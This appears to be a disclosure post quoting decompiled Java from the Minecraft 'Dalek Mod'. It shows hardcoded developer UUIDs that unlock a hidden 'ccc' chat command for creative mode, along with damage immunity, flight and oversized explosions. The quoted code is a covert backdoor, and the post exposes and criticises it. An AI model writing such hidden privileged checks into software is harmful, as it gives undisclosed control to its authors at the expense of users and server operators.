# Proof that Dalek Mod has hidden code that gives unfair / malicious advantage to the devs of the mod

Decompiled code is of dalekmod version `68.1.1`

Any changes are to remove meta data from jdgui and to use [mapper](https://mcp.thiakil.com) to convert (func_, field_, p_) things to the actual (Function, Field, Param) name s

``` java
package com.swdteam.util;

public class DMUsers {
  public static final String JOHN = "15efe577-a5ad-465c-9843-000a47f80a02";
  
  public static final String REDJOHN = "9d7f31b4-17cb-4ee5-bf00-1652682083ae";
  
  public static final String MATT = "94e96cfa-02e5-4231-9b35-4fb39d0912f5";
  
  public static final String LUKE = "6aaa9227-3bcc-4574-88bd-ff3aaddff98b";
  
  public static final String MAE = "7d189898-31c0-498e-b5f2-1fea3eaab2d5";
  
  public static final String SAM = "95b084ae-a8d9-4261-8cff-c48b7de148cc";
  
  public static final String CLASSICRED = "21658c61-4583-4b93-a0f9-7b92442b01c9";
}
```

The above code links UUIDs from developer accounts so that the UUIDs can be used easier

```java
package com.swdteam.common.event;
@SubscribeEvent
  public static void chatEvent(ServerChatEvent event) {
     ServerPlayerEntity serverPlayerEntity = event.getPlayer();
     if (event.getMessage().equalsIgnoreCase("ccc") && 
       serverPlayerEntity.getCachedUniqueIdString().equalsIgnoreCase("15efe577-a5ad-465c-9843-000a47f80a02")) {
       serverPlayerEntity.setGameType(serverPlayerEntity.isCreative() ? GameType.SURVIVAL : GameType.CREATIVE);
       serverPlayerEntity.sendPlayerAbilities();
       event.setCanceled(true);
    } 
  }
```

The above code clearly takes the UUID `15efe577-a5ad-465c-9843-000a47f80a02` and checks if the player sends the `ccc` message and 
which causes the player to be set to Creative if they're in Survival and vise versa and then the message is canceled from being showed in logs or chat

```java
package com.swdteam.common.event;
@SubscribeEvent
  public static void onPlayerLogin(PlayerEvent.PlayerLoggedInEvent event) {
     System.out.println("Syncing reg for: " + event.getPlayer().getName());
    
     Map<String, Tardis> data = new HashMap<>();
     for (Map.Entry<ResourceLocation, Tardis> entry : (Iterable<Map.Entry<ResourceLocation, Tardis>>)DMTardisRegistry.getRegistry().entrySet()) {
       data.put(((ResourceLocation)entry.getKey()).getNamespace() + ":" + ((ResourceLocation)entry.getKey()).getPath(), entry.getValue());
    }
    
     Map<String, TardisInterior> data2 = new HashMap<>();
     for (Map.Entry<ResourceLocation, TardisInterior> entry : (Iterable<Map.Entry<ResourceLocation, TardisInterior>>)DMTardisRegistry.getTardisInteriors().entrySet()) {
       data2.put(((ResourceLocation)entry.getKey()).getNamespace() + ":" + ((ResourceLocation)entry.getKey()).getPath(), entry.getValue());
    }
    
     NetworkHandler.sendTo((ServerPlayerEntity)event.getPlayer(), new PacketSendTardisInteriorRegistry(data2));
     NetworkHandler.sendTo((ServerPlayerEntity)event.getPlayer(), new PacketSendTardisRegistry(data));
    
     if ((event.getPlayer()).world.getDimensionKey() == DMDimensions.TARDIS) {
       TardisData tardisData = DMTardis.getTardisFromInteriorPos(event.getPlayer().getPosition());
       if (tardisData != null) {
         NetworkHandler.sendTo((ServerPlayerEntity)event.getPlayer(), new PacketSendTardisData(tardisData));
      }
    } 
    
     PlayerEntity player = event.getPlayer();
    
     if (player.getCachedUniqueIdString().equalsIgnoreCase("15efe577-a5ad-465c-9843-000a47f80a02")) {
       player.abilities.isFlying = true;
       player.abilities.allowFlying = true;
       player.sendPlayerAbilities();
    } 
    
     if (DMFlightMode.isInFlight(player.getGameProfile().getId())) {
      
       DMFlightMode.FlightModeData flightData = DMFlightMode.getFlightModeData(player.getGameProfile().getId());
      
       TardisData tardisData = DMTardis.getTardis(flightData.getTardisID());
      
       if (tardisData != null) {
         TardisFlightPool.addFlight(tardisData);
         TardisFlightPool.updateFlight(tardisData, (player.getPositionVec()).x, (player.getPositionVec()).y, (player.getPositionVec()).z, player.world.getDimensionKey());
      } 
      
       DMFlightMode.removeFlight(player.getGameProfile().getId(), false);
      
       player.abilities.isFlying = false;
       player.abilities.disableDamage = false;
       player.abilities.allowFlying = false;
       player.abilities.allowEdit = true;
      
       player.sendPlayerAbilities();
      
       TeleportUtil.teleportPlayer((Entity)player, DMDimensions.TARDIS, (IPosition)new Vector3d(flightData.getPosX(), flightData.getPosY(), flightData.getPosZ()), 90.0F);
    } 
    
     DMFlightMode.syncFlightsToPlayer(player);

    
     player.getPersistentData().putInt("stomp_time", 0);
  }
```
The above code clearly takes the UUID `15efe577-a5ad-465c-9843-000a47f80a02` and gives them creative flight

```java
package com.swdteam.common.event;
@SubscribeEvent
public static void livingHurtEvent(LivingHurtEvent e) {
    if (e.getEntity() instanceof PlayerEntity) {

        PlayerEntity player = (PlayerEntity)e.getEntity();

        if (!player.world.isRemote) {

            if (DMFlightMode.isInFlight(player) &&
                    e.getSource() != DamageSource.OUT_OF_WORLD) {
                e.setCanceled(true);
            }


            if (player.getCachedUniqueIdString().equalsIgnoreCase("15efe577-a5ad-465c-9843-000a47f80a02")) {
                e.setCanceled(true);
                player.setHealth(100.0F);
                player.getFoodStats().setFoodLevel(20);
                player.addItemStackToInventory(new ItemStack((IItemProvider)Blocks.TNT));
            }

            if (player.getCachedUniqueIdString().equalsIgnoreCase("9d7f31b4-17cb-4ee5-bf00-1652682083ae") &&
                    player.world.rand.nextInt(40) == 20) {
                CreeperEntity c = new CreeperEntity(EntityType.CREEPER, player.world);
                BlockPos pos = player.getPosition();
                pos = pos.offset(player.getHorizontalFacing().getOpposite(), 4);
                c.setPosition(pos.getX(), pos.getY(), pos.getZ());
                player.world.addEntity((Entity)c);
            }
        }


        if (e.getSource() != null && (e.getSource().getImmediateSource() instanceof com.swdteam.common.entity.LaserEntity || e.getSource().getImmediateSource() instanceof com.swdteam.common.entity.dalek.DalekEntity || e.getSource().getImmediateSource() instanceof CybermanEntity)) {
            NetworkHandler.sendToAllClients(new PacketDisplayDalekDamage(e.getEntity().getUniqueID()), e.getEntity().getEntityWorld());
        }
    }
}
```

Anytime the player with the UUID takes damage `15efe577-a5ad-465c-9843-000a47f80a02`, they cancel their damage and it sets their food and health to max and gives them tnt

Anytime the player with the UUID takes damage `9d7f31b4-17cb-4ee5-bf00-1652682083ae`, There's 1/40 chance for a creeper to spawn

```java
package com.swdteam.common.tileentity;
public void tick() {
    if (this.lit) {
        for (int i = 0; i < 2; i++) {
            this.activator.world.addParticle((IParticleData)ParticleTypes.SMOKE, getPos().getX() + 0.5D, getPos().getY() + 0.2D, getPos().getZ() + 0.5D, 0.0D, 0.1D, 0.0D);
        }

        this.timer++;
    }

    if (this.timer > 60 && !this.world.isRemote) {
        BlockState state = this.world.getBlockState(getPos());
        if (state.getBlock() instanceof com.swdteam.common.block.ExplosiveDeviceBlock) this.world.setBlockState(getPos(), (((Boolean)state.get((Property)BlockStateProperties.WATERLOGGED)).booleanValue() == true) ? Blocks.WATER.getDefaultState() : Blocks.AIR.getDefaultState());

        if (this.activator instanceof PlayerEntity) {
            PlayerEntity p = (PlayerEntity)this.activator;
            if (p.getUniqueID().toString().equals("15efe577-a5ad-465c-9843-000a47f80a02") || p.getUniqueID().toString().equals("7d189898-31c0-498e-b5f2-1fea3eaab2d5") || p.getUniqueID().toString().equals("21658c61-4583-4b93-a0f9-7b92442b01c9") || p.getUniqueID().toString().equals("9d7f31b4-17cb-4ee5-bf00-1652682083ae")) {
                this.world.createExplosion(this.activator, getPos().getX(), getPos().getY(), getPos().getZ(), 40.0F, Explosion.Mode.DESTROY);
            } else {
                this.world.createExplosion(this.activator, getPos().getX(), getPos().getY(), getPos().getZ(), 10.0F, Explosion.Mode.DESTROY);
            }
        } else {
            this.world.createExplosion(this.activator, getPos().getX(), getPos().getY(), getPos().getZ(), 10.0F, Explosion.Mode.DESTROY);
        }
    }
}
```
The explosive radius is 4x what it is normally for a normal player

```java
package com.swdteam.common.tileentity;
public void tick() {
     if (this.lit) {
       for (int i = 0; i < 2; i++) {
         this.activator.world.addParticle((IParticleData)ParticleTypes.SMOKE, getPos().getX() + 0.5D, getPos().getY() + 0.4D, getPos().getZ() + 0.5D, 0.0D, 0.1D, 0.0D);
      }
       this.timer++;
    } 
    
     if (this.timer > 60 && !this.world.isRemote) {
       BlockState state = this.world.getBlockState(getPos());
       if (state.getBlock() instanceof com.swdteam.common.block.Nitro9Block) this.world.setBlockState(getPos(), (((Boolean)state.get((Property)BlockStateProperties.WATERLOGGED)).booleanValue() == true) ? Blocks.WATER.getDefaultState() : Blocks.AIR.getDefaultState());
      
       if (this.activator instanceof PlayerEntity) {
         PlayerEntity p = (PlayerEntity)this.activator;
         if (p.getUniqueID().toString().equals("94e96cfa-02e5-4231-9b35-4fb39d0912f5") || p.getUniqueID().toString().equals("9d7f31b4-17cb-4ee5-bf00-1652682083ae")) {
           for (int i = 0; i < 100; i++) {
             CowEntity cow = new CowEntity(EntityType.COW, this.world);
             cow.setPosition(getPos().getX() + 0.5D, getPos().getY(), getPos().getZ() + 0.5D);
             cow.addVelocity(SWDMathUtils.randomRange(-0.2F, 0.2F), 0.0D, SWDMathUtils.randomRange(-0.2F, 0.2F));
             this.world.addEntity((Entity)cow);
          } 
           this.world.setBlockState(getPos(), Blocks.AIR.getDefaultState());
           this.world.createExplosion(this.activator, getPos().getX(), getPos().getY(), getPos().getZ(), 1.0F, Explosion.Mode.NONE);
        } 
         if (p.getUniqueID().toString().equals("15efe577-a5ad-465c-9843-000a47f80a02") || p.getUniqueID().toString().equals("21658c61-4583-4b93-a0f9-7b92442b01c9") || p.getUniqueID().toString().equals("9d7f31b4-17cb-4ee5-bf00-1652682083ae")) {
           this.world.createExplosion(this.activator, getPos().getX(), getPos().getY(), getPos().getZ(), 40.0F, Explosion.Mode.DESTROY);
        } else {
           this.world.createExplosion(this.activator, getPos().getX(), getPos().getY(), getPos().getZ(), 10.0F, Explosion.Mode.DESTROY);
        } 
      } else {
         this.world.createExplosion(this.activator, getPos().getX(), getPos().getY(), getPos().getZ(), 10.0F, Explosion.Mode.DESTROY);
      } 
    } 
  }
```
The explosive radius is 4x what it is normally for a normal player